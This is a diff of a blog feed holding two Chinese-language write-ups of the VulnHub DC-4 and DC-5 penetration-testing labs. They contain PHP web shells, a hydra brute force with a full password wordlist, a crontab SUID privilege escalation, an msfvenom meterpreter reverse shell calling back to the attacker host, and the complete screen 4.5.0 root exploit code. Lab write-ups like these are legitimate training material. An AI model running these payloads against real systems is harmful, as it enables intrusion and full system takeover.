-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>DC-4</title>
-      <link href="/2022/04/17/DC-4/"/>
-      <url>/2022/04/17/DC-4/</url>
-      
-        <content type="html"><![CDATA[<p>渗透环境：DC4 <a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/1.png" alt="img"></p><p>发现目标主机为192.168.168.131</p><h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.131</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/2.png" alt="img"></p><p>开放了80端口和22端口，浏览器打开</p><p><img src="/2022/04/17/DC-4/cover.png" alt="img"></p><h3 id="收集其他信息"><a href="#收集其他信息" class="headerlink" title="收集其他信息"></a>收集其他信息</h3><p>用dirsearch看看目录情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.130/ -e *</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/3.png" alt="img"></p><p>有个command.php，应该是远程命令执行了</p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>显示用burp进行爆破</p><p><img src="/2022/04/17/DC-4/4.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：admin</span><br><span class="line">密码：happy</span><br></pre></td></tr></table></figure><p>登录进去</p><p><img src="/2022/04/17/DC-4/5.png" alt="img"></p><p>确实是命令执行<br>抓包<br>修改上传参数<br>上一个base64木马上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg== &quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure><p>上传成功</p><p><img src="/2022/04/17/DC-4/6.png" alt="img"></p><p>蚁剑连接</p><p><img src="/2022/04/17/DC-4/7.png" alt="img"></p><p>查看&#x2F;home下有什么内容<br>在&#x2F;home&#x2F;jim&#x2F;backups&#x2F;old-passwords.bak下找到了旧密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><span class="line">000000</span><br><span class="line">12345</span><br><span class="line">iloveyou</span><br><span class="line">1q2w3e4r5t</span><br><span class="line">1234</span><br><span class="line">123456a</span><br><span class="line">qwertyuiop</span><br><span class="line">monkey</span><br><span class="line">123321</span><br><span class="line">dragon</span><br><span class="line">654321</span><br><span class="line">666666</span><br><span class="line">123</span><br><span class="line">myspace1</span><br><span class="line">a123456</span><br><span class="line">121212</span><br><span class="line">1qaz2wsx</span><br><span class="line">123qwe</span><br><span class="line">123abc</span><br><span class="line">tinkle</span><br><span class="line">target123</span><br><span class="line">gwerty</span><br><span class="line">1g2w3e4r</span><br><span class="line">gwerty123</span><br><span class="line">zag12wsx</span><br><span class="line">7777777</span><br><span class="line">qwerty1</span><br><span class="line">1q2w3e4r</span><br><span class="line">987654321</span><br><span class="line">222222</span><br><span class="line">qwe123</span><br><span class="line">qwerty123</span><br><span class="line">zxcvbnm</span><br><span class="line">555555</span><br><span class="line">112233</span><br><span class="line">fuckyou</span><br><span class="line">asdfghjkl</span><br><span class="line">12345a</span><br><span class="line">123123123</span><br><span class="line">1q2w3e</span><br><span class="line">qazwsx</span><br><span class="line">loveme1</span><br><span class="line">juventus</span><br><span class="line">jennifer1</span><br><span class="line">!~!1</span><br><span class="line">bubbles</span><br><span class="line">samuel</span><br><span class="line">fuckoff</span><br><span class="line">lovers</span><br><span class="line">cheese1</span><br><span class="line">0123456</span><br><span class="line">123asd</span><br><span class="line">999999999</span><br><span class="line">madison</span><br><span class="line">elizabeth1</span><br><span class="line">music</span><br><span class="line">buster1</span><br><span class="line">lauren</span><br><span class="line">david1</span><br><span class="line">tigger1</span><br><span class="line">123qweasd</span><br><span class="line">taylor1</span><br><span class="line">carlos</span><br><span class="line">tinkerbell</span><br><span class="line">samantha1</span><br><span class="line">Sojdlg123aljg</span><br><span class="line">joshua1</span><br><span class="line">poop</span><br><span class="line">stella</span><br><span class="line">myspace123</span><br><span class="line">asdasd5</span><br><span class="line">freedom1</span><br><span class="line">whatever1</span><br><span class="line">xxxxxx</span><br><span class="line">00000</span><br><span class="line">valentina</span><br><span class="line">a1b2c3</span><br><span class="line">741852963</span><br><span class="line">austin</span><br><span class="line">monica</span><br><span class="line">qaz123</span><br><span class="line">lovely1</span><br><span class="line">music1</span><br><span class="line">harley1</span><br><span class="line">family1</span><br><span class="line">spongebob1</span><br><span class="line">steven</span><br><span class="line">nirvana</span><br><span class="line">1234abcd</span><br><span class="line">hellokitty</span><br><span class="line">thomas1</span><br><span class="line">cooper</span><br><span class="line">520520</span><br><span class="line">muffin</span><br><span class="line">christian1</span><br><span class="line">love13</span><br><span class="line">fucku2</span><br><span class="line">arsenal1</span><br><span class="line">lucky7</span><br><span class="line">diablo</span><br><span class="line">apples</span><br><span class="line">george1</span><br><span class="line">babyboy1</span><br><span class="line">crystal</span><br><span class="line">1122334455</span><br><span class="line">player1</span><br><span class="line">aa123456</span><br><span class="line">vfhbyf</span><br><span class="line">forever1</span><br><span class="line">Password</span><br><span class="line">winston</span><br><span class="line">chivas1</span><br><span class="line">sexy</span><br><span class="line">hockey1</span><br><span class="line">1a2b3c4d</span><br><span class="line">pussy</span><br><span class="line">playboy1</span><br><span class="line">stalker</span><br><span class="line">cherry</span><br><span class="line">tweety</span><br><span class="line">toyota</span><br><span class="line">creative</span><br><span class="line">gemini</span><br><span class="line">pretty1</span><br><span class="line">maverick</span><br><span class="line">brittany1</span><br><span class="line">nathan1</span><br><span class="line">letmein1</span><br><span class="line">cameron1</span><br><span class="line">secret1</span><br><span class="line">google1</span><br><span class="line">heaven</span><br><span class="line">martina</span><br><span class="line">murphy</span><br><span class="line">spongebob</span><br><span class="line">uQA9Ebw445</span><br><span class="line">fernando</span><br><span class="line">pretty</span><br><span class="line">startfinding</span><br><span class="line">softball</span><br><span class="line">dolphin1</span><br><span class="line">fuckme</span><br><span class="line">test123</span><br><span class="line">qwerty1234</span><br><span class="line">kobe24</span><br><span class="line">alejandro</span><br><span class="line">adrian</span><br><span class="line">september</span><br><span class="line">aaaaaa1</span><br><span class="line">bubba1</span><br><span class="line">isabella</span><br><span class="line">abc123456</span><br><span class="line">password3</span><br><span class="line">jason1</span><br><span class="line">abcdefg123</span><br><span class="line">loveyou1</span><br><span class="line">shannon</span><br><span class="line">100200</span><br><span class="line">manuel</span><br><span class="line">leonardo</span><br><span class="line">molly1</span><br><span class="line">flowers</span><br><span class="line">123456z</span><br><span class="line">007007</span><br><span class="line">password.</span><br><span class="line">321321</span><br><span class="line">miguel</span><br><span class="line">samsung1</span><br><span class="line">sergey</span><br><span class="line">sweet1</span><br><span class="line">abc1234</span><br><span class="line">windows</span><br><span class="line">qwert123</span><br><span class="line">vfrcbv</span><br><span class="line">poohbear</span><br><span class="line">d123456</span><br><span class="line">school1</span><br><span class="line">badboy</span><br><span class="line">951753</span><br><span class="line">123456c</span><br><span class="line">111</span><br><span class="line">steven1</span><br><span class="line">snoopy1</span><br><span class="line">garfield</span><br><span class="line">YAgjecc826</span><br><span class="line">compaq</span><br><span class="line">candy1</span><br><span class="line">sarah1</span><br><span class="line">qwerty123456</span><br><span class="line">123456l</span><br><span class="line">eminem1</span><br><span class="line">141414</span><br><span class="line">789789</span><br><span class="line">maria</span><br><span class="line">steelers</span><br><span class="line">iloveme1</span><br><span class="line">morgan1</span><br><span class="line">winner</span><br><span class="line">boomer</span><br><span class="line">lolita</span><br><span class="line">nastya</span><br><span class="line">alexis1</span><br><span class="line">carmen</span><br><span class="line">angelo</span><br><span class="line">nicholas1</span><br><span class="line">portugal</span><br><span class="line">precious</span><br><span class="line">jackass1</span><br><span class="line">jonathan1</span><br><span class="line">yfnfif</span><br><span class="line">bitch</span><br><span class="line">tiffany</span><br><span class="line">rabbit</span><br><span class="line">rainbow1</span><br><span class="line">angel123</span><br><span class="line">popcorn</span><br><span class="line">barbara</span><br><span class="line">brandy</span><br><span class="line">starwars1</span><br><span class="line">barney</span><br><span class="line">natalia</span><br><span class="line">jibril04</span><br><span class="line">hiphop</span><br><span class="line">tiffany1</span><br><span class="line">shorty</span><br><span class="line">poohbear1</span><br><span class="line">simone</span><br><span class="line">albert</span><br><span class="line">marlboro</span><br><span class="line">hardcore</span><br><span class="line">cowboys</span><br><span class="line">sydney</span><br><span class="line">alex</span><br><span class="line">scorpio</span><br><span class="line">1234512345</span><br><span class="line">q12345</span><br><span class="line">qq123456</span><br><span class="line">onelove</span><br><span class="line">bond007</span><br><span class="line">abcdefg1</span><br><span class="line">eagles</span><br><span class="line">crystal1</span><br><span class="line">azertyuiop</span><br><span class="line">winter</span><br><span class="line">sexy12</span><br><span class="line">angelina</span><br><span class="line">james</span><br><span class="line">svetlana</span><br><span class="line">fatima</span><br><span class="line">123456k</span><br><span class="line">icecream</span><br><span class="line">popcorn1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用hydra进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P ./dc4.txt  ssh://192.168.168.131</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/8.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：jim</span><br><span class="line">密码：jibril04</span><br></pre></td></tr></table></figure><p>用xshll或是kali连接到目标主机<br>看看身份</p><p><img src="/2022/04/17/DC-4/9.png" alt="img"></p><p>通过上传漏洞探测器，发现没有可用的提权漏洞<br>发现之前存在的一条信息</p><p><img src="/2022/04/17/DC-4/10.png" alt="img"></p><p>我有一条信息<br>去看看吧</p><p><img src="/2022/04/17/DC-4/11.png" alt="img"></p><p>这样就知道了charles的密码了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：charles</span><br><span class="line">密码： ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure><p>登录charles的号看看<br>看了charles可以用sudo了</p><p><img src="/2022/04/17/DC-4/12.png" alt="img"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>teehee是一个小的编辑器<br>这里我通过crontab提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo teehee /etc/crontab</span><br><span class="line">* * * * * root <span class="built_in">chmod</span> 4777 /bin/sh  //4777普通用户也能执行</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/14.png" alt="img"></p><p>分钟 小时 日期 月 周 用户 命令<br>ctrl+c退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">cat</span> /root/the-flag.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/17/DC-4/13.png" alt="img"></p>]]></content>
-      
-      
+      <tags>
+        <tag>渗透</tag>
+        <tag>提取</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-5</title>
+    <url>/2022/04/17/DC-5/</url>
+    <content><![CDATA[<p>渗透环境：DC5 <a href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫面存活主机"><a href="#扫面存活主机" class="headerlink" title="扫面存活主机"></a>扫面存活主机</h3><p>还是老规矩，nmap</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-5/1.png" alt="img"></p>
+<p>发现目标主机为192.168.168.133</p>
+<h3 id="扫描主机开放端口"><a href="#扫描主机开放端口" class="headerlink" title="扫描主机开放端口"></a>扫描主机开放端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.133</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-5/2.png" alt="img"></p>
+<p>开放了80端口浏览器打开</p>
+<p><img src="/2022/04/17/DC-5/3.png" alt="img"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>只看到这个页面有注入的可能，试试<br>然后返回了thankyou.php过来</p>
+<p><img src="/2022/04/17/DC-5/4.png" alt="img"></p>
+<p>看看有没有存在sql注入，xss注入的可能<br>测试过，没反应<br>最后发现可以文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-5/5.png" alt="img"></p>
+<p>这里用日志注入的方法getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.168.133/&lt;?php @assert($_POST[&#x27;test&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查看日志文件位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-5/6.png" alt="img"></p>
+<p>查看文件，用蚁剑连接</p>
+<p><img src="/2022/04/17/DC-5/8.png" alt="img"></p>
+<h3 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.168.128 //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.128 LPORT=4444 -f raw &gt; shell.php //生成shell</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>将shell.php通过蚁剑上传到&#x2F;tmp<br>访问对应shell.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thankyou.php?file=/tmp/shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-5/9.png" alt="img"></p>
+<p>连接成功</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-5/10.png" alt="img"></p>
+<p>有个screen-4.5.0看看有没有漏洞可用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br><span class="line"><span class="built_in">cd</span> /usr/share/exploitdb/exploits/linux/local</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-5/11.png" alt="img"></p>
+<p>把第一个文件通过蚁剑上传，看看能不能run<br>结果报错了<br>分析对应sh</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<p>根据上面逻辑得到3段代码，本地编译<br>libhax.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure>
+
+<p>rootshell.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>
+
+<p>run.sh</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so... </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<p>把run.sh, rootshell, libhax.so上传到&#x2F;tmp文件夹中<br>执行run.sh文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./run.sh</span><br></pre></td></tr></table></figure>
+
+<p>成功提权后</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/thisistheflag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/17/DC-5/12.png" alt="img"></p>
+<p>获得flag，DC-5clear</p>
+]]></content>
       <categories>
-          
-          <category> 实践 </category>
-          
+        <category>实践</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 渗透 </tag>
-            
-            <tag> 提取 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>DC-3</title>
-      <link href="/2022/04/16/DC-3/"/>
-      <url>/2022/04/16/DC-3/</url>
-      
